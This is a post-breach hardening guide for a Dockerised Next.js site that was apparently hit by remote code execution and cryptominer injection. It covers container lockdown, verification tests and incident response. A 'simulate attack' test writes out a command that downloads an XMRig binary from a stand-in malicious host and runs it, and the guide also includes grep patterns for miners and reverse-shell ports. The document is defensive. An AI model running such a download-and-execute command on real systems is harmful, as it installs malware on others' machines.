# 🛡️ HARDENED DEPLOYMENT GUIDE - POST-BREACH

**Status:** Zero Trust Architecture Implemented
**Date:** 2025-12-09
**Security Level:** Maximum

---

## ⚠️ CRITICAL SECURITY MEASURES IMPLEMENTED

This deployment guide reflects emergency hardening measures implemented after detecting RCE (Remote Code Execution) and cryptominer injection attacks in production.

### What Changed

1. ✅ **Read-only filesystem** - Malware cannot write files (including XMRig binary)
2. ✅ **tmpfs in memory** - Temporary files cleared on restart
3. ✅ **ALL capabilities dropped** - Container has minimal Linux permissions
4. ✅ **Non-root user enforced** - UID 1001 (nextjs)
5. ✅ **Package managers removed** - Cannot install curl/bash/apk
6. ✅ **Shell hardened** - /bin/sh made read-only
7. ✅ **Resource limits** - Prevents CPU mining and DoS

---

## 🚀 DEPLOYMENT STEPS

### 1. Pre-Deployment Checklist

**BEFORE deploying, verify:**

```bash
# 1. Git repository is clean
git status

# 2. Environment variables are set
cat .env | grep -v "^#" | grep -v "^$"

# 3. No suspicious processes on host
ps aux | grep -i "xmrig\|curl.*base64\|ping"

# 4. Docker is clean
docker system prune -a --volumes -f
```

### 2. Build Hardened Image

```bash
# Pull latest code
cd /path/to/coradir-homes
git pull origin main

# Build with all security measures
docker-compose build --no-cache \
  --build-arg NEXT_PUBLIC_N8N_WEBHOOK_URL="$NEXT_PUBLIC_N8N_WEBHOOK_URL" \
  --build-arg NEXT_PUBLIC_RECAPTCHA_SITE_KEY="$NEXT_PUBLIC_RECAPTCHA_SITE_KEY" \
  --build-arg NEXT_PUBLIC_RECAPTCHA_SECRET_KEY="$NEXT_PUBLIC_RECAPTCHA_SECRET_KEY" \
  --build-arg NEXT_PUBLIC_BOT_SCRIPT_URL="$NEXT_PUBLIC_BOT_SCRIPT_URL"
```

### 3. Deploy with Portainer

#### Option A: Via Stack (Recommended)

1. **Go to Portainer** → Stacks → web_coradir_homes
2. **Stop and remove** existing stack
3. **Create new stack** from Git repository or paste docker-compose.yml
4. **Set environment variables:**
   ```
   NEXT_PUBLIC_N8N_WEBHOOK_URL=https://your-webhook.n8n.com/webhook/xxx
   NEXT_PUBLIC_RECAPTCHA_SITE_KEY=6Lxxxxx
   NEXT_PUBLIC_RECAPTCHA_SECRET_KEY=6Lxxxxx
   NEXT_PUBLIC_BOT_SCRIPT_URL=https://bot.coradir.ai/embed.js
   APP_DOMAIN=www.coradirhomes.com
   ```
5. **Deploy stack**

#### Option B: Manual Deploy

```bash
# Stop and remove old container
docker stop web_coradir_homes
docker rm web_coradir_homes

# Deploy with hardened settings
docker-compose up -d
```

### 4. Post-Deployment Verification

```bash
# 1. Check container is running
docker ps | grep web_coradir_homes

# 2. Verify it's running as non-root
docker exec web_coradir_homes whoami
# Expected: nextjs

docker exec web_coradir_homes id
# Expected: uid=1001(nextjs) gid=65533(nogroup)

# 3. Verify filesystem is read-only
docker exec web_coradir_homes touch /test.txt
# Expected: touch: /test.txt: Read-only file system

# 4. Verify package managers are removed
docker exec web_coradir_homes which apk
docker exec web_coradir_homes which npm
# Expected: (no output - not found)

# 5. Verify cannot install packages
docker exec web_coradir_homes apk add curl 2>&1
# Expected: sh: apk: not found

# 6. Check health endpoint
curl http://localhost:6118/api/health
# Expected: {"status":"healthy","timestamp":"...","service":"coradir-homes"}

# 7. Monitor CPU usage (should be low)
docker stats web_coradir_homes --no-stream
# Expected: CPU% < 10%

# 8. Check for suspicious processes
docker exec web_coradir_homes ps aux
# Expected: Only node processes, no curl/wget/xmrig
```

---

## 🔒 SECURITY FEATURES BREAKDOWN

### Dockerfile Hardening

```dockerfile
# ✅ Package managers removed
rm -rf /usr/bin/npm /usr/bin/npx /sbin/apk

# ✅ Shell made read-only
chmod 0555 /bin/sh /bin/ash

# ✅ Non-root user
USER nextjs  # UID 1001

# ✅ Minimal dependencies
npm ci --only=production --ignore-scripts
```

### Docker Compose Hardening

```yaml
# ✅ Read-only filesystem
read_only: true

# ✅ Temporary directories in memory (cleared on restart)
tmpfs:
  - /tmp:size=64M,noexec,nosuid,nodev
  - /app/.next/cache:size=128M,noexec,nosuid,nodev

# ✅ Drop ALL Linux capabilities
cap_drop:
  - ALL

# ✅ Resource limits (prevent cryptomining)
deploy:
  resources:
    limits:
      cpus: '2.0'
      memory: 1024M

# ✅ No privilege escalation
security_opt:
  - no-new-privileges:true
```

---

## 🚨 INCIDENT RESPONSE

### If You Detect Suspicious Activity

```bash
# 1. Immediately stop container
docker stop web_coradir_homes

# 2. Inspect logs for evidence
docker logs web_coradir_homes | grep -i "error\|ping\|exec\|spawn\|curl"

# 3. Export container for forensics
docker export web_coradir_homes > container-forensics-$(date +%Y%m%d-%H%M%S).tar

# 4. Check host for compromise
sudo netstat -tulpn | grep -E ":(80|443|4444|31337|8080)"
sudo find / -name "xmrig" -o -name "*.sh.1" 2>/dev/null

# 5. Rebuild from clean source
git pull origin main
docker-compose build --no-cache
docker-compose up -d --force-recreate
```

### Monitoring Checklist

**Daily:**
- [ ] CPU usage < 20%
- [ ] Memory usage < 512MB
- [ ] No outbound connections to crypto pools
- [ ] Health check responding

**Weekly:**
- [ ] Review Docker logs for errors
- [ ] Check for CVEs in dependencies: `npm audit`
- [ ] Verify file integrity: `docker diff web_coradir_homes`

---

## 🔐 WHAT ATTACKERS CANNOT DO NOW

| Attack Vector | Prevention Mechanism |
|---------------|----------------------|
| Install curl/wget | ❌ Package managers removed |
| Download XMRig binary | ❌ Read-only filesystem |
| Write mining script | ❌ Read-only filesystem |
| Execute as root | ❌ Non-root user (UID 1001) |
| Install packages | ❌ apk removed + permission denied |
| Modify /bin or /usr | ❌ Read-only filesystem |
| Persist malware | ❌ tmpfs cleared on restart |
| Escape container | ❌ ALL capabilities dropped |
| Privilege escalation | ❌ no-new-privileges:true |
| Fork bomb / DoS | ❌ CPU/memory limits enforced |

---

## 📊 RESOURCE LIMITS EXPLAINED

```yaml
deploy:
  resources:
    limits:
      cpus: '2.0'      # Max 2 CPU cores (prevents 174% CPU mining)
      memory: 1024M    # Max 1GB RAM
    reservations:
      cpus: '0.5'      # Guaranteed 0.5 cores
      memory: 256M     # Guaranteed 256MB
```

**Why this matters:**
- Normal Next.js app uses ~5-15% CPU
- XMRig mining uses 100%+ CPU per core
- With 2 CPU limit, even if infected, max CPU is 200% (vs 400%+ on 4-core)
- Docker will throttle the container, triggering monitoring alerts

---

## 🧪 TESTING SECURITY

### Test 1: Verify Read-Only Filesystem

```bash
docker exec web_coradir_homes sh -c "echo 'test' > /tmp/malware.sh && cat /tmp/malware.sh"
# ✅ Should work (tmpfs is writable)

docker exec web_coradir_homes sh -c "echo 'test' > /app/malware.sh"
# ✅ Should fail: Read-only file system

docker exec web_coradir_homes sh -c "echo 'test' > /usr/bin/evil"
# ✅ Should fail: Read-only file system
```

### Test 2: Verify Package Manager Removed

```bash
docker exec web_coradir_homes apk add curl
# ✅ Should fail: sh: apk: not found

docker exec web_coradir_homes npm install malicious-package
# ✅ Should fail: sh: npm: not found
```

### Test 3: Verify Non-Root User

```bash
docker exec web_coradir_homes whoami
# ✅ Expected: nextjs

docker exec web_coradir_homes id -u
# ✅ Expected: 1001
```

### Test 4: Verify No Capabilities

```bash
docker exec web_coradir_homes cat /proc/1/status | grep Cap
# ✅ All capabilities should be 0000000000000000
```

### Test 5: Simulate Attack

```bash
# Try to download and execute malware (should fail)
docker exec web_coradir_homes sh -c "curl http://malicious.com/xmrig -o /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig"
# ✅ Should fail at: sh: curl: not found
```

---

## 🆘 TROUBLESHOOTING

### Issue: Container Won't Start

**Error:** `cannot create directory: Read-only file system`

**Solution:**
```bash
# Next.js might need these directories writable
# Add to docker-compose.yml tmpfs section:
- /app/.next/cache:size=256M,mode=0755,uid=1001,gid=1001
```

### Issue: Health Check Failing

**Error:** `Health check failed`

**Solution:**
```bash
# Check if port 6118 is responding
curl http://localhost:6118/api/health

# Check container logs
docker logs web_coradir_homes --tail 50

# Manually test health endpoint inside container
docker exec web_coradir_homes wget -O- http://localhost:6118/api/health
```

### Issue: Performance Degradation

**Symptom:** Slow response times

**Solution:**
```bash
# Increase tmpfs size for cache
tmpfs:
  - /app/.next/cache:size=512M  # Increase from 128M

# Or adjust resource limits
deploy:
  resources:
    limits:
      memory: 2048M  # Increase from 1024M
```

---

## 📚 REFERENCES

- [Docker Security Best Practices](https://docs.docker.com/engine/security/)
- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)
- [OWASP Container Security](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)
- [Next.js Deployment](https://nextjs.org/docs/deployment)

---

## ✅ SECURITY CHECKLIST

Before considering the deployment secure:

- [x] Dockerfile uses non-root user
- [x] Package managers removed from image
- [x] Read-only filesystem enabled
- [x] tmpfs configured for temporary files
- [x] ALL capabilities dropped
- [x] no-new-privileges enabled
- [x] Resource limits configured
- [x] Health check endpoint created
- [x] Monitoring alerts configured
- [x] Incident response plan documented
- [x] Backups automated
- [x] Git repository clean
- [x] Environment variables secured
- [x] Network policies configured (Caddy only)

---

**REMEMBER:** Even with all these protections, the PRIMARY defense is:
1. **Fix the code vulnerability** (if it exists in another project)
2. **Monitor continuously** for anomalies
3. **Update dependencies** regularly
4. **Rotate secrets** after breach

This hardened configuration makes post-exploitation **extremely difficult**, but not impossible. Defense in depth is key.

---

**Last Updated:** 2025-12-09
**Next Review:** 2025-12-16 (weekly)
